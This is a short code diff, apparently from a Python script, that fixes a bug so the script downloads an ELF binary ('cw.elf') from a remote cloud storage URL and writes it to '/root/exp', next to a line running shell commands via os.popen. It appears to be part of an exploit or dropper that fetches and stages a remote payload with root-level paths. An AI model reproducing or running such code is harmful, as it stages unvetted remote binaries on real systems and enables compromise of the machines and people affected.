@@ -9,7 +9,7 @@ result = os.popen(command).read()
 
 
 down_url='https://isdp.oss-cn-shanghai.aliyuncs.com/cw.elf'
-response = requests.get(url)
+response = requests.get(down_url)
 if response.status_code == 200:
   with open('/root/exp', 'wb') as file:
     file.write(response.content)
